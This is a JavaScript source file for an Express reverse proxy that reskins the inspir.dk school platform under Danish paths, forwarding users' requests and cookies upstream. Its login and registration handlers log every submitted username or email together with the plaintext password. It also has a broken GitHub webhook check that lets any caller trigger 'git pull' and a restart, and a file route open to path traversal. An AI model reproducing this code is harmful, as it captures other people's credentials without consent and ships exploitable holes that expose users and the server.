require("express-async-errors");

const fs = require("fs");
const { exec } = require('child_process');

const express = require("express");
const axios = require("axios");
const cheerio = require("cheerio");

const config = require("./config.json");


const server = express();
const database = require("./database.js");


const modules = require("./module_registry.js");
modules.register("articles");
modules.register("article_dates");
modules.register("article_views");


// Github webhook
server.post("/github-push", (req, res) => {
	if (!req.headers["x-github-hook-id"] == config.githubWebhookId) return;
	res.status(200).end();

	exec("git pull", (error, stdout, stderr) => {
		console.log(stdout);
		process.exit();
	});
});


// Resources
function fileExists(filePath) {
	try {
		fs.accessSync(filePath, fs.constants.R_OK);
		return true;
	} catch {
		return false;
	}
}

server.get(/\/custom(\/.+)/, (req, res) => { // Could I use express.static()?
	let filePath = `${__dirname}/files/${req.params[0]}`;
	if (fileExists(filePath)) {
		res.sendFile(filePath);
	} else {
		res.status(404).send("404 not found").end();
	}
});


// Path remapping
const remapPaths = [ // Order matters here
	{from: "user/login", to: "login"},
	{from: "e9a/htg/", to: "artikel/"},
	{from: "e9a/htg", to: ""},
	{from: "admin/articles/overview/9e106940-5c97-11ee-b9bf-d56e49dc725a", to: "redaktør"},
	{from: "admin/articles/overview", to: "redaktør"},
	{from: "admin/articles/edit/", to: "rediger-artikel/"},
	{from: "admin/articles/preview-article/", to: "forhåndsvis-artikel/"},
	{from: "account/details", to: "profil"},
	{from: "councils/list", to: "udvalg"},
	{from: "klassen/arsbog/", to: "person/"},
	{from: "register/step-three/", to: "registrer/"},
	{from: "register/school-list/e9a", to: "registrer"}
];

function remapAllPaths(string, pathRegex) {
	return string.replaceAll(pathRegex, path => {
		let remapFromKey = path.startsWith("/") ? path.slice(1) : path;

		for (let { from, to } of remapPaths) {
			if (from == "") { // Root has to be exact
				if (remapFromKey == "") return "/" + to;
			} else if (remapFromKey.startsWith(from)) {
				return "/" + remapFromKey.replace(from, to);
			}
		}

		return path;
	});
}

function unmapAllPaths(string, pathRegex) {
	return string.replaceAll(pathRegex, path => {
		let remapFromKey = path.startsWith("/") ? path.slice(1) : path;

		for (let { from, to } of remapPaths) {
			if (to == "") { // Root has to be exact
				if (remapFromKey == "") return "/" + from;
			} else if (remapFromKey.startsWith(to)) {
				return "/" + remapFromKey.replace(to, from);
			}
		}

		return path;
	});
}


// URL params
const remapCategoryNames = {
	"nyt": "new",
	"sjovt": "faq",
	"fagligt": "hack",
	"aktiviteter": "calendar"
};

function paramsHook(req, params) {
	let typeParam = params.get("type") || "";
	if (req.path == "/") {
		if (typeParam) {
			let newCategoryName = remapCategoryNames[typeParam];
			if (newCategoryName) params.set("type", newCategoryName);
		} else {
			params.set("type", "new");
		}
	}
}


// Redirects
function changeRedirect(req, redirectUrl, params) {
	if (redirectUrl == "/page") {
		return "/";
	} else if (req.method == "POST" && req.path == "/login") {
		if (redirectUrl.startsWith("/user/login")) {
			params.set("incorrect", "true");
			return `/login?${decodeURIComponent(params.toString())}`;
		} else {
			return req.query["backTo"] || "/";
		}
	} else if (req.method == "POST" && req.path.startsWith("/registrer/")) {
		return "/";
	} else if (req.method == "GET" && req.path == "/user/logout") {
		return req.query["backTo"] || "/";
	} else {
		return redirectUrl;
	}
}


// HTML
const pageInjects = {
	"/login": "login",
	"/hovedmenu": "homepage",
	"/": "front-page",
	"/artikel/": "article",
	"/redaktør": "editor",
	"/rediger-artikel/": "edit-article",
	"/forhåndsvis-artikel/": "preview-article",
	"/profil": "profile",
	"/udvalg": "udvalg",
	"/klassen": "class",
	"/person/": "person",
	"/registrer": "register-1",
	"/registrer/": "register-2"
};

const oldDomainHrefRegex = /(?<=href=")https?:\/\/(?:www)?\.inspir\.dk/g;
const urlPathHrefRegex = /(?<=href=")[^?"]*/g;
const backToPathHrefRegex = /(?<=href="[^"]+backTo=)[^&"]*/g;

async function pageHook(req, html) {
	// Path remapping (is done before parsing html cause I can't be bothered to change it lol)
	let remappedHtml = html;
	remappedHtml = remappedHtml.replaceAll(oldDomainHrefRegex, "");
	remappedHtml = remapAllPaths(remappedHtml, urlPathHrefRegex);
	remappedHtml = remapAllPaths(remappedHtml, backToPathHrefRegex);

	// Parse HTML
	let $ = cheerio.load(remappedHtml);
	let jQueryScript = $("body script[src*='code.jquery.com']");
	let datatablesScript = $("body script[src*='cdn.datatables.net']");

	// Fixes to redaktør page
	if (req.path == "/redaktør") {
		datatablesScript.insertAfter(jQueryScript);
		$("body script").each((_, script) => {
			$(script).html($(script).html().replace(/^\s*initDataTable\(\);?/, ""));
		});
	}

	// Injects
	let lastHead = $("head").last(); // Yes, there can be multiple heads cause these pages are so weird
	let lastRequiredScript = $("body script[src*='code.jquery.com'], body script[src*='cdn.datatables.net']").last();

	lastHead.append(`<link rel="stylesheet" href="/custom/css/general.css">`);
	lastRequiredScript.after(`<script src="/custom/js/general.js"></script>`);

	let injectName = pageInjects[req.path];
	if (!injectName) {
		let subpathInjectKey = Object.keys(pageInjects).find(k => 
			k != "/" && k.endsWith("/") && req.path.startsWith(k)
		);
		if (subpathInjectKey) injectName = pageInjects[subpathInjectKey];
	}
	if (injectName) {
		lastHead.append(`<link rel="stylesheet" href="/custom/css/${injectName}.css">`);
		lastRequiredScript.next().after(`<script src="/custom/js/${injectName}.js"></script>`);
	}

	// Module hooks with page handle
	await modules.callRequestHooks(database, req, $);

	return $.html();
}


// I'm temporarily logging logins - so people don't forget their passwords and for testing purposes :)
server.post("/login", express.urlencoded({extended: true}), (req, res, next) => {
	let { query, password } = req.body;
	console.log(`${query} | ${password}`);
	next();
});

server.post("/registrer", express.urlencoded({extended: true}), (req, res, next) => {
	let { email, password } = req.body;
	console.log(`[+] ${email} | ${password}`);
	next();
});


// Main handler
const oldDomainRegex = /https?:\/\/(?:www)?\.inspir\.dk/g;
const urlPathRegex = /\/[^?]*/g;

server.use(express.raw({type: "*/*", limit: "100mb"}), async (req, res) => {
	req.url = decodeURI(req.url);

	let inspirUrlEnd = req.url;
	inspirUrlEnd = inspirUrlEnd.replaceAll(/%2f/gi, "⧸");

	let paramsStr = (inspirUrlEnd.match(/(?<=\?).+/) || [""])[0];
	let params = new URLSearchParams(paramsStr);
	paramsHook(req, params);
	inspirUrlEnd = `${req.path}${params.size > 0 ? ("?" + params.toString()) : ""}`;

	inspirUrlEnd = unmapAllPaths(inspirUrlEnd, /^[^?]+/g);

	delete req.headers.host;
	let inspirRes = await axios({
		method: req.method,
		url: `https://www.inspir.dk${inspirUrlEnd}`,
		headers: req.headers,
		data: req.body,
		responseType: "arraybuffer",
		responseEncoding: "binary",
		maxRedirects: 0,
		validateStatus: () => true
	});

	if (
		(inspirRes.status >= 400 && inspirRes.status < 600) || 
		(inspirRes.headers.location || "").endsWith("/e9a")
	) {
		res.sendFile(`${__dirname}/files/not_found.html`);
		return;
	}

	let redirectUrl = inspirRes.headers.location;
	if (redirectUrl) {
		redirectUrl = redirectUrl.replace(oldDomainRegex, "");
		redirectUrl = changeRedirect(req, redirectUrl, params);
		if (redirectUrl.startsWith("/")) {
			redirectUrl = remapAllPaths(redirectUrl, urlPathRegex);
		}
		inspirRes.headers.location = encodeURI(redirectUrl);
	}

	let contentType = inspirRes.headers["content-type"];
	if (
		!redirectUrl && req.method == "GET" && 
		contentType && contentType.startsWith("text/html")
	) {
		let encodingMatch = contentType.match(/charset=([^;]+)/);
		let encoding = encodingMatch ? encodingMatch[1] : "utf8";
		
		let html = inspirRes.data.toString(encoding)
		let newHtml = await pageHook(req, html);
		inspirRes.data = Buffer.from(newHtml, encoding);
	} else if (req.method != "GET") {
		modules.callRequestHooks(database, req, null);
	}

	// To fix a glitch (I think) where nginx complains when both transfer-encoding and content-length are sent
	delete inspirRes.headers["transfer-encoding"];

	res.statusMessage = inspirRes.statusText;
	res.status(inspirRes.status);
	res.set(inspirRes.headers);
	res.send(inspirRes.data);
	res.end();
});


// Error handler
server.use((err, req, res, next) => {
	let timeStr = (new Date()).toLocaleString({timeZone: "Europe/Copenhagen"});
  console.error(timeStr, req.url, err);

  res.status(500).send("<title>Fejl</title>Beklager, der opstod en fejl...").end();
})


// Start app
server.listen(process.env.LOCAL ? 80 : config.port, "127.0.0.1", () => {
	console.log("Server ready");

	database.connect(process.env.LOCAL ? config.dbRemoteOptions : config.dbOptions).then(() => {
		console.log("Database connected");
		modules.ready(database);
	}).catch((err) => {
		console.error("Failed to connect to database :(");
		console.error(err);
	});
});